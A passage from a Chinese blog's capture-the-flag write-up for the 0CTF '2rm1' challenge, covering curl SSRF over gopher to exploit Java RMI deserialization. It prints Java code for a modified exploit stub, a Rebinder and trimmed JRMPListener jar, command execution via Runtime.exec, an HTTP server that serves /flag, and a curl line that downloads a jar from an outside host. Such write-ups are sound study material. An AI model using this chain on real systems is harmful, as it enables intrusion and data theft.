+        Stub<span class="token punctuation">.</span><span class="token function">exploit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> tcp_port<span class="token punctuation">,</span> payloadObject<span class="token punctuation">,</span> objID<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>exploit也魔改一下，把对远程输出的内容写到本地，拖到vps上，再整个页面进行gopher转发</p>
+<h5 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h5><p>一切看起来都非常的美好且顺利，但实际上我踩了无数个坑，虽然都是因为我太菜了。。。</p>
+<ol>
+<li>完全相同的代码在不同的环境下lookup的stub不一致。虽然由stub生成的payload和目标主机的ip端口并无关系，但不同主机直接的stub并不一致。一开始我以为这个也是一致的就直接拿着本地返回的stub在打，浪费了好多时间。</li>
+<li>registry端口和service端口并不一致！！！虽然这是个显而易见而愚蠢的问题，但由于工具里是自动从stub里拿到服务的ip port，导致我并没有意识到这一点，打了一个下午都一直报<code>noSuchObject</code>的错误，找了好久，在这里再次感谢rmb神仙的指导呜呜呜呜，麻烦师傅了</li>
+<li>不能直接把二进制文件读出来然后拼在gopher后面重定向，可以url编码一次，curl居然也能正常解析，但PHP的urlencode会把空格变成+，这似乎会影响curl重定向的解析，手动替换一下改成%20。</li>
+<li>最好是能怎么样把原始数据存下来，之前因为一直打不通以为lookup的生命周期很短，所以我抄了一个java的http请求函数，但是这个函数用了utf8对结果解码，虽然好像在这里没有影响，但是rmb神仙还是建议我不要这么做并发出多个 气晕.jpg。呜呜呜，最好还是直接用curl访问直接写文件</li>
+</ol>
+<h4 id="写入jar包"><a href="#写入jar包" class="headerlink" title="写入jar包"></a>写入jar包</h4><p>命令执行了并没有什么用，server和client不能出网，并且反序列化一般没有回显，再之在server上执行命令并不能拿到client上的flag。而对client能做的就是用spider去触发他调用server的sayHello方法，所以思路应该是往server上写一个JRMPListener的jar包。当然，调用的方法已经在server上注册了，那个端口虽然能通过lookup拿到，但实际上是已经被占用了的，所以可以用rebind方法，把这个唯一的服务重新换一个端口，且端口可以在exportObject函数中固定，填0就是随机分配端口。但同样的，exportObject也会将这个端口占用，因此需要在registry上注册了这个端口之后把服务停了，然后在这个端口上起一个JRMPListener，代码如下（当然是抄rmb的，再磕一个头）<br>这里约定一个12345端口，然后在把yso里面JRMPListener给拉出来，把端口直接写死成约定端口，魔改一下</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Rebinder</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            UserInter userImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            UserInter user <span class="token operator">=</span> <span class="token punctuation">(</span>UserInter<span class="token punctuation">)</span> UnicastRemoteObject<span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>userImpl<span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"0ops"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"rebind success!exit!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            var4<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里也踩了一天的坑，yso的JRMPListener中有几个外部依赖，其中有一个叫javassist，是用来魔改字节码之类的造一个类的。如果不去掉这个依赖，那么我们的简单Rebinder+JRMPListener缝合怪会直接700k+，但仔细跟入会发现，这个第三方库只在JRMPListener的一个构造函数中使用，而当前我们的情况并不需要这个构造函数，而是使用的另一个构造函数，仔细翻一下发现所有的第三方依赖均在当前的简单情况下为非必要的，都可以去掉。这样子就能把我们的缝合怪压缩到20k-<br>之所以要压缩缝合怪，是因为我们需要用之前的命令执行在server上echo来一个jar包，因此我们的这个jar包就会完全包含在我们的payload中，而payload是header重定向塞在gopher里的，payload过长会出现不可预知的错误，简单来说就是跑不通。<br>并且想echo二进制数据到文件，为了防止二进制数据中奇怪的字符串破坏命令，最好还要将二进制文件先base64encode一下，到时候在decode输出，防止出现奇怪字符导致的问题，但这样又会将整个文件的大小增加大概33%，更加跑不通了<br>尝试对扩张后的1000k文件进行分片压缩，分到100k每份，也跑不通</p>
+<p>因此，听从rmb神仙的建议，翻了翻JRMPListener的依赖，把不必要的代码和依赖删掉，把缝合怪jar压缩到17k-，然后base64保障安全20k+，20k+能够直接一把梭写到server上，然后再改一下payload把jar跑起来</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Runtime r <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Process p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"java -cp /tmp/servergadget.jar com.yxxx.Rebinder"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"java -cp /tmp/servergadget.jar com.yxxx.yso.JRMPListener"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>JRMPListener里面的利用类就直接把题目给的gadget塞进去就行了，简单的利用简单的快乐。</p>
+<h3 id="攻击RMIclient"><a href="#攻击RMIclient" class="headerlink" title="攻击RMIclient"></a>攻击RMIclient</h3><p>但面临着和攻击server的同样困境，client不通外网，且命令执行没有回显。也就是说之前对server的攻击其实全是盲打，完全不知道打没打通，所以本地复现的时候拿题目环境在本地搭了docker，边打边进docker看写进去了没。。。<br>攻击client同样也得想办法怎么外带出来，唯一的外带点就是我们可爱的spider。所以比较实用的方法是起一个HTTPserver，或者直接nc一个端口，连上来就给flag，python也能启动简单的httpserver，但是在docker里试了一下，诶，nc，python都没有。只能启动httpserver了。</p>
+<p>那么现在的问题就在于，怎么再塞一个jar包到client上，同样的，我们也可以再echo到server上的JRMPListener里面的payload再塞一个echo，打好包的httpserver jar再echo出来，这样子的话就不能用可爱的spring boot了，这个玩意必定打包依赖，一打出来能用10M+，绝对的暴毙<br>百度了一下java原生类的httpserver，能打一个20k以内的jar包，功能就直接读flag拿出来了，其实代码还能再删减一点，整体base64超级打包应该能在50k内解决，但不知道50k能不能搞定，实在不行就分两半写入</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpServer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetSocketAddress<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>Executors<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleHttpd</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        HttpServer httpServer <span class="token operator">=</span> HttpServer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">8083</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        httpServer<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/myserver"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">MyHttpHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        httpServer<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span>Executors<span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        httpServer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpExchange<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpHandler<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileReader<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyHttpHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            StringBuilder responseText <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            StringBuilder flag <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            String str<span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                flag<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            responseText<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">handleResponse</span><span class="token punctuation">(</span>httpExchange<span class="token punctuation">,</span> responseText<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">,</span> String responsetext<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        StringBuilder responseContent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        responseContent<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;html>"</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;body>"</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>responsetext<span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>"</span><span class="token punctuation">)</span>
+                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String responseContentStr <span class="token operator">=</span> responseContent<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> responseContentByte <span class="token operator">=</span> responseContentStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        httpExchange<span class="token punctuation">.</span><span class="token function">getResponseHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Content-Type:"</span><span class="token punctuation">,</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> responseContentByte<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        OutputStream out <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>responseContentByte<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>rmb神仙提出了另一个极其巧妙的解决方案，可以让client调用curl通过spider在外网上下载，这样子就只需要在JRMPListener里面塞一句curl就能把vps上的jar包给下下来了<code>curl http://spider:8080/?url=https://xxxxx/1.jar &gt; /tmp/1.jar</code><br>然后再把JRMPListener的payload改一下启动简易http服务，spider访问拿到flag。<br>这么说来server那里也可以直接把命令改成curl通过spider下jar包，也就没有之前那么麻烦的去删依赖了</p>
+<p>这里想到vps上直接用nc向外提供jar包，这样子的话如果连上来了还能有个回显，不至于太盲打</p>
+<h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>整体理下来这个题目似乎并不是非常的复杂，首先通过curl重定向更改协议，用gopher攻击rmi服务，在rmi服务上命令执行后启动一个JRMPListener，再通过spider触发client访问JRMPListener，做到在client上命令执行，最后想办法（比如http服务器）将flag外带</p>
+<p><del>事实上，最后一步没有打通，也就是让client访问JRMPListener进行命令执行，但非常奇怪的点是，我进入client容器用spider下了一个直接进行RMI调用的jar包，然后运行那个jar包是能打通的，而用spider触发client去访问却打不通，最近要忙国赛和保研了，如果一切都顺利结束再回来填坑吧</del></p>
+<h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>没有rmb神仙的wp和连续两三天的高强度指导我肯定复现不出来这个题，期间因为我垃圾的基础知识还问了他很多愚蠢的问题，再次表示感谢呜呜呜</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/RMI/" rel="tag"># RMI</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E5%88%B7%E9%A2%98%E5%88%B7%E9%A2%98.html" rel="prev" title="刷题刷题">
+      <i class="fa fa-chevron-left"></i> 刷题刷题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88.html" rel="next" title="虚拟网络杂谈">
+      虚拟网络杂谈 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TCTF-x2F-0CTF"><span class="nav-number">1.</span> <span class="nav-text">TCTF&#x2F;0CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1linephp"><span class="nav-number">1.1.</span> <span class="nav-text">1linephp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8Bwp"><span class="nav-number">1.1.1.</span> <span class="nav-text">看wp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2rm1"><span class="nav-number">1.2.</span> <span class="nav-text">2rm1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">奇怪的前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-ssrf"><span class="nav-number">1.2.2.</span> <span class="nav-text">curl ssrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBserver"><span class="nav-number">1.2.3.</span> <span class="nav-text">攻击server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BBRMIserver"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">攻击RMIserver</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91"><span class="nav-number">1.2.3.2.1.</span> <span class="nav-text">踩坑</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5jar%E5%8C%85"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">写入jar包</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBRMIclient"><span class="nav-number">1.2.4.</span> <span class="nav-text">攻击RMIclient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#end"><span class="nav-number">1.2.5.</span> <span class="nav-text">end</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">1.2.6.</span> <span class="nav-text">致谢</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
